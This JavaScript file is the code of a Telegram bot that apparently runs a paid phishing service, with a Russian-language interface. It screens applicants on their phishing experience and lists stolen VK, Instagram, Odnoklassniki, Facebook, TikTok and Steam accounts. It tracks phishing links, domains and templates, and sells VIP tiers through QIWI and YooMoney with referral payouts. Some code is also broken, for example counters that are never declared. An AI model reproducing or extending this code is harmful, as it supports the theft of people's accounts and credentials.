const bot = require('./createBot')
const adminCommands = require('./adminCommands')
const promocode = require('./database/models/promo')
const data = require('./database/models/userData')
const account = require('./database/models/account')
const link = require('./database/models/link')
const isAuth = require('./middleware/AuthCheck')
const {
    GetStringDate,
    GetDaysCount,
    VipCheck
} = require('./server/tools')
const {
    vip,
    menuList
} = require('./objects')

function ban(reason) {
    // console.log('b')
}

function edit(type) {
    // console.log('e')
}
bot.onText(/\/start/, (msg) => {
    isAuth(msg)
})
bot.onText(/Подать заявку/, async (msg) => {
    if (isAuth) {
        bot.sendMessage(msg.chat.id, '1. Был ли у тебя опыт в фишинге?', {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Да",
                        callback_data: "experiance_true"
                    }, {
                        text: "Нет",
                        callback_data: "experiance_false"
                    }],
                ]
            }
        })
    }
})
bot.onText(/Написать админу/, (msg) => {
    bot.sendMessage(msg.chat.id, 'Связаться с админом можно тут 👉🏻 ' + process.env.Admin)
})
bot.onText(/👤 Мой профиль/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true' && !user.edit_mode && !user.ban) {
        let today = 0,
            week = 0,
            month = 0
        const accounts = await account.find({
            tg_id: msg.chat.id
        })
        accounts.map(account => {
            let x = GetDaysCount(account.date)
            if (x >= 0 && x <= 1) {
                today++
                week++
                month++
            }
            if (x > 1 && x <= 7) {
                week++
                month++
            }
            if (x > 7 && x <= 30) {
                month++
            }
        })
        let admin = 'Пользователь'
        if (user.vip) {
            admin = 'VIP Пользователь'
        }
        if (user.isAdmin) {
            admin = 'Администратор'
        }
        user.links_info.map(link => {
            visit++
            if (link.auth_visit) {
                authVist++
            }
        })
        await bot.sendMessage(msg.chat.id, `👤 Мой профиль\n\n🆔 ID: <code>${msg.chat.id}</code>\n🎗 Статус: ${admin}\n\n💸 Баланс: ${user.balance}₽\n\n☘️ Аккаунтов за сегодня: ${today}\n☘️ Аккаунтов за неделю: ${week}\n☘️ Аккаунтов за месяц: ${month}\n☘️ Аккаунтов за всё время: ${accounts.length}\n\n👀 Переходов за всё время: ${accounts.length}\n🔐 Переходов на авторизацию за всё время: ${accounts.length}`, {
            parse_mode: 'HTML'
        })
    } else {
        user.edit_mode ? edit(user.edit_modeType) : ban(user.ban_reason)
    }
})
bot.onText(/👥 Мои аккаунты/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true' && !user.edit_mode && !user.ban) {
        bot.sendMessage(msg.chat.id, `👀Пожалуйста выберите тип аккаунтов`, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: 'Вконтакте',
                        callback_data: 'showAccs_vk'
                    }, {
                        text: 'Instagram',
                        callback_data: 'showAccs_inst'
                    }],
                    [{
                        text: 'Одноклассники',
                        callback_data: 'showAccs_ok'
                    }, {
                        text: 'Facebook',
                        callback_data: 'showAccs_fb'
                    }],
                    [{
                        text: 'TikTok',
                        callback_data: 'showAccs_tt'
                    }, {
                        text: 'Steam',
                        callback_data: 'showAccs_st'
                    }],
                    [{
                        text: '➡️',
                        callback_data: 'nextAccsReplay_3'
                    }]
                ]
            }
        })
    } else {
        user.edit_mode ? edit(user.edit_modeType) : ban(user.ban_reason)
    }
})
bot.onText(/🔗 Мои ссылки/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true' && !user.edit_mode && !user.ban) {
        if (user.vip) {
            bot.sendMessage(msg.chat.id, `😻 Пожалуйста выберите категорию`, {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Вконтакте',
                            callback_data: 'showLinks_vk'
                        }, {
                            text: 'Instagram',
                            callback_data: 'showLinks_inst'
                        }],
                        [{
                            text: 'Одноклассники',
                            callback_data: 'showLinks_ok'
                        }, {
                            text: 'Facebook',
                            callback_data: 'showLinks_fb'
                        }],
                        [{
                            text: 'TikTok',
                            callback_data: 'showLinks_tt'
                        }, {
                            text: 'Steam',
                            callback_data: 'showLinks_st'
                        }],
                        [{
                            text: '➡️',
                            callback_data: 'nextLinksReplay_3'
                        }]
                    ]
                }
            })
        } else {
            bot.sendMessage(msg.chat.id, `У вас нет активного <b>VIP</b> статуса😔\nВы можете приобрести его пополнив баланс и нажав кнопку ниже⤵️`, {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Купить VIP',
                            callback_data: 'show_vip'
                        }]
                    ]
                },
                parse_mode: 'HTML'
            })
        }
    } else {
        user.edit_mode ? edit(user.edit_modeType) : ban(user.ban_reason)
    }
})
bot.onText(/📊 О боте/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true' && !user.edit_mode && !user.ban) {
        const users = await data.find(),
            accounts = await account.find(),
            links = await link.find();
        let reg_today = 0,
            reg_week = 0,
            reg_month = 0,
            reg_alltime = users.length,
            sites = links.length,
            pattern = 0,
            accs_today = 0,
            accs_week = 0,
            accs_month = 0,
            accs_alltime = accounts.length,
            vip_1 = 0,
            vip_2 = 0,
            vip_3 = 0,
            vip_4 = 0;
        users.map(e => {
            let x = GetDaysCount(e.reg_date)
            if (e.vip) {
                if (e.vipType == '1') {
                    vip_1++
                }
                if (e.vipType == '2') {
                    vip_2++
                }
                if (e.vipType == '3') {
                    vip_3++
                }
                if (e.vipType == '4') {
                    vip_4++
                }
            }
            if (x >= 0 && x <= 1) {
                reg_today++
                reg_week++
                reg_month++
            }
            if (x > 1 && x <= 7) {
                reg_week++
                reg_month++
            }
            if (x > 7 && x <= 30) {
                reg_month++
            }
        })
        links.map(e => {
            e.query.map(i => {
                pattern++
            })
        })
        accounts.map(account => {
            let x = GetDaysCount(account.date)
            if (x >= 0 && x <= 1) {
                accs_today++
                accs_week++
                accs_month++
            }
            if (x > 1 && x <= 7) {
                accs_week++
                accs_month++
            }
            if (x > 7 && x <= 30) {
                accs_month++
            }
        })
        bot.sendMessage(msg.chat.id, `📊 Статистика\n\n😻Регистраций в боте за сегодня: ${reg_today}\n😻Регистраций в боте за неделю: ${reg_week}\n😻Регистраций в боте за месяц: ${reg_month}\n😻Регистраций в боте за все время: ${reg_alltime}\n\n👨‍👩‍👧‍👦 Подписчиков в Новостях: ${await bot.getChatMemberCount('@ssniffer')}\n👨‍👩‍👧‍👦 Подписчиков в Чате: ${await bot.getChatMemberCount('@sniffer_chat')}\n👨‍👩‍👧‍👦 Подписчиков в Отзывах: ${await bot.getChatMemberCount('@ssniffero')}\n\n📎 Количество доменов: ${sites}\n📁 Количество шаблонов: ${pattern}\n\n🍀 Аккаунтов за сегодня: ${accs_today}\n🍀 Аккаунтов за неделю: ${accs_week}\n🍀 Аккаунтов за месяц: ${accs_month}\n🍀 Аккаунтов за все время: ${accs_alltime}\n\n👑 Пользователи [⛏Рабочий]: ${vip_1}\n👑 Пользователи [🤴🏻Любитель]: ${vip_2}\n👑 Пользователи [🥷Профи]: ${vip_3}\n👑 Пользователи [👀Предпрениматель]: ${vip_4}\n\n📅 Мы работаем с 2021 года.`, {
            parse_mode: 'HTML'
        })
    } else {
        user.edit_mode ? edit(user.edit_modeType) : ban(user.ban_reason)
    }
})
bot.onText(/👑 VIP Статус/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true' && !user.edit_mode && !user.ban) {
        if (user.vip) {
            bot.sendMessage(msg.chat.id, `🤴🏻 У вас есть <b>VIP</b> статус [${vip[Number(user.vipType)].name}].\n\n⏳ VIP закончится через⤵️ \n⏱ ${GetStringDate(new Date(user.vipDate))}`, {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Продлить VIP',
                            callback_data: 'show_vip'
                        }]
                    ]
                },
                parse_mode: 'HTML'
            })
        } else {
            bot.sendMessage(msg.chat.id, `У вас нет активного <b>VIP</b> статуса😔\nВы можете приобрести его пополнив баланс и нажав кнопку ниже⤵️`, {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Купить VIP',
                            callback_data: 'show_vip'
                        }]
                    ]
                },
                parse_mode: 'HTML'
            })
        }
    } else {
        user.edit_mode ? edit(user.edit_modeType) : ban(user.ban_reason)
    }
})
bot.onText(/❓ Информация/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true' && !user.edit_mode && !user.ban) {
        bot.sendMessage(msg.chat.id, `<b>❓ Информация</b>\n\n<b>♦️ Администратор</b> - ${process.env.Admin}  (По всем вопросам)\n\nОтветы на самые часто задаваемые вопросы написаты в статье\nhttps://teletype.in/@ssniffer/Nj73iy7Ps7z`, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: 'Правила',
                        url: 'https://t.me/joinchat/1yuUy9l4yYQ2N2My'
                    }],
                    [{
                        text: '⚡️ Новости',
                        url: process.env.Channel
                    }, {
                        text: '👥 Чат',
                        url: process.env.Chat
                    }]
                ]
            },
            parse_mode: 'HTML',
            disable_web_page_preview: true
        })
    } else {
        user.edit_mode ? edit(user.edit_modeType) : ban(user.ban_reason)
    }
})
bot.onText(/🎁 Получить бонус/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true' && !user.edit_mode && !user.ban) {
        bot.sendMessage(msg.chat.id, `🎁 Получить бонус\n\nЧто даёт бонус?\n- При первом пополнении, (35₽ в Подарок🎁😻)\n\nДля того, чтобы получить бонус вы должны оставить положительный отзыв в нашей группе (https://t.me/ssniffero). Отзыв должен быть подкреплен скриншотом из своего профиля, чтобы отзыв не удалили.\nБонус работает только 1 раз, повторно его получить нельзя\n\n😻 Чтобы получить бонус на свой аккаунт - напишите Администратору (@vincicash_s).`, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: '📜 Оставить отзыв',
                        url: 'https://t.me/ssniffero'
                    }, {
                        text: '🎁 Забрать бонус',
                        url: 'https://t.me/vincicash_s'
                    }]
                ]
            },
            disable_web_page_preview: true
        })
    } else {
        user.edit_mode ? edit(user.edit_modeType) : ban(user.ban_reason)
    }
})
bot.onText(/💸 Пополнение/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true' && !user.edit_mode && !user.ban) {
        bot.sendMessage(msg.chat.id, `💸 Пополнение баланса\n\nВаш актуальный баланс: ${user.balance} RUB\n\nМинимальная сумма пополнения — 100 рублей\n\n💚 Пополнение через QIWI\n💜 Пополнение через ЮMoney\n🧡 Пополнение через WebMoney\n\nНе нашли для себя удобного способа оплаты? Напишите нашему представителю по контактам ниже и мы что-нибудь придумаем для Вас\nПредставитель: @vincicash_s\n\nКакой  VIP статус лучше взять?\nhttps://teletype.in/@ssniffer/howbuy\n\nА так же если у вас есть сомнения по нашему боту можете посмотреть отзывы по кнопке ниже⤵️`, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: '💰Пополнить Баланс',
                        url: 'https://t.me/VinciCash_S'
                    }],
                    [{
                        text: '🗂 История транзакций',
                        callback_data: 'transactions'
                    }, {
                        text: '🍀 Отзывы',
                        url: 'https://t.me/ssniffero'
                    }]
                ]
            },
            disable_web_page_preview: true
        })
    } else {
        user.edit_mode ? edit(user.edit_modeType) : ban(user.ban_reason)
    }
})
bot.onText(/🎟 Промо-Коды/, async msg => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true' && !user.edit_mode && !user.ban) {
        bot.sendMessage(msg.chat.id, `🎟 Промо-Коды\n\nПромо-коды выдаються только Администрацией.\nКод может содержать различные ценности: VIP, Домен, Пополнения баланса многое другое...\n\nГде достать Промо-Коды?\nМы часто публикуем Промо-Коды, в нашем Новостном канале.\n(${process.env.Channel})\n\nЧто бы забрать Промо-Код первым,\nСоветуем подписаться на канал, и включить колокольчик🔔`, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: 'Ввести промокод',
                        callback_data: 'promo'
                    }]
                ]
            },
            parse_mode: 'html',
            disable_web_page_preview: true
        })
    } else {
        user.edit_mode ? edit(user.edit_modeType) : ban(user.ban_reason)
    }
})
bot.onText(/👨‍👩‍👧‍👦 Мои рефералы/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true' && !user.edit_mode && !user.ban) {
        const ref = await data.find({
            ref_id: msg.chat.id
        })
        bot.sendMessage(msg.chat.id, `👨‍👩‍👧‍👦 Мои рефералы\n\nВаш реферальный баланс: ${user.ref_balance||0} RUB\n\nКоличество ваших рефералов: ${ref.length||0}\n\nКаждый Ваш реферал при пополнении своего баланса будет начислять Вам на реферальный баланс +20% от суммы.\nЧто можно будет сделать с реферальным балансом?\n\nПеревести его в общий баланс и использовать на покупку вип и прочего.\n\nПри достижении суммы больше 200 рублей Вы можете запросить выплату на Ваш Qiwi кошелек или на Карту\n\nЧтобы запросить выплату или конвертировать в баланс бота, напишите нашему\nПредставителю: @vincicash_s\n\nВаша реферальная ссылка🔗\n<a>https://t.me/${(await bot.getMe()).username}?start=${user.tg_id}</a>\n\nКлюч для выплат\n<code>${user.tg_id}</code>`, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: 'Запросить выплату',
                        url: 'https://t.me/VinciCash_S'
                    }]
                ]
            },
            parse_mode: 'html',
            disable_web_page_preview: true
        })
    } else {
        user.edit_mode ? edit(user.edit_modeType) : ban(user.ban_reason)
    }
})

bot.on('message', async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.edit_mode) {
        if (!menuList.includes(msg.text)) {
            await promocode.findOne({
                promo: msg.text
            }).then(async e => {
                if (e) {
                    let usedBy = e.usedBy,
                        used = false
                    usedBy.map(i => {
                        if (i.tg_id == msg.chat.id) {
                            used = true
                        }
                    })
                    if (e.activations < e.mactivation && !used) {
                        usedBy.push({
                            tg_id: msg.chat.id,
                            login: msg.chat.username,
                            date: new Date()
                        })
                        if(e.type =='balance'){
                            await data.updateOne({
                                tg_id: msg.chat.id
                            }, {
                                balance: user.balance + Number(e.value),
                                transactions: [...user.transactions, {
                                    type: 'Промокод',
                                    value: '+' + e.value,
                                    date: new Date()
                                }]
                            }, {
                                upsert: true
                            })
                        }else{
                            let date = new Date()
                            date.setHours(date.getHours() + Number(e.value))
                            await data.updateOne({
                                tg_id: msg.chat.id
                            }, {
                                vip: true,
                                vipDate: date,
                                vipType: 1,
                            }, {
                                upsert: true
                            })
                        }
                        
                        await promocode.updateOne({
                            promo: msg.text
                        }, {
                            activations: e.activations + 1,
                            usedBy: usedBy
                        }, {
                            upsert: true
                        }).then((data2) => {
                            if (data2) {
                                bot.sendMessage(msg.chat.id, `✅ Промокод ${msg.text} успешно активирован, ${e.type =='balance'?'вам зачислено на баланс '+e.value+' RUB': 'Вы получили '+e.value+' часов VIP статуса'}`, {}).then(async it => {
                                    const x = await data.updateOne({
                                        tg_id: msg.chat.id
                                    }, {
                                        edit_mode: false,
                                        edit_modeType: ''
                                    }, {
                                        upsert: true
                                    })
                                })
                            }
                        }).catch(err => {
                            bot.sendMessage(msg.chat.id, `❌ Что-то пошло не так 😥, попробуйте позже\nДля выхода из режима ввода нажмите кнопку ниже`, {
                                reply_markup: {
                                    inline_keyboard: [
                                        [{
                                            text: 'Выйти',
                                            callback_data: 'remove_editmode'
                                        }]
                                    ]
                                }
                            })
                        });
                    } else {
                        bot.sendMessage(msg.chat.id, used ? `❌ Промокод ${msg.text} уже использован вами ранее.` : `❌ Промокод ${msg.text} уже использован максимальное количество раз.\nДля выхода из режима ввода нажмите кнопку ниже`, {
                            reply_markup: {
                                inline_keyboard: [
                                    [{
                                        text: 'Выйти',
                                        callback_data: 'remove_editmode'
                                    }]
                                ]
                            }
                        })
                    }
                } else {
                    bot.sendMessage(msg.chat.id, `❌ Промокод ${msg.text} не найден\nДля выход из режима ввода нажмите кнопку ниже`, {
                        reply_markup: {
                            inline_keyboard: [
                                [{
                                    text: 'Выйти',
                                    callback_data: 'remove_editmode'
                                }]
                            ]
                        }
                    })
                }
            })
        } else {
            bot.sendMessage(msg.chat.id, `Для выхода из режима ввода нажмите кнопку ниже`, {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Выйти',
                            callback_data: 'remove_editmode'
                        }]
                    ]
                }
            })
        }
    }
    if (user && user.vip) {
        if (VipCheck(user.vipDate)) {
            setTimeout(async () => {
                await data.updateOne({
                    tg_id: msg.chat.id
                }, {
                    vip: false,
                    vipType: '',
                }, {
                    upsert: true
                })
                bot.sendMessage(msg.chat.id, 'Ваш VIP статус закончился, вы можете приобрести его по кнопке ниже', {
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                text: 'Купить VIP',
                                callback_data: 'show_vip'
                            }]
                        ]
                    }
                })
            }, 200)
        }
    }
})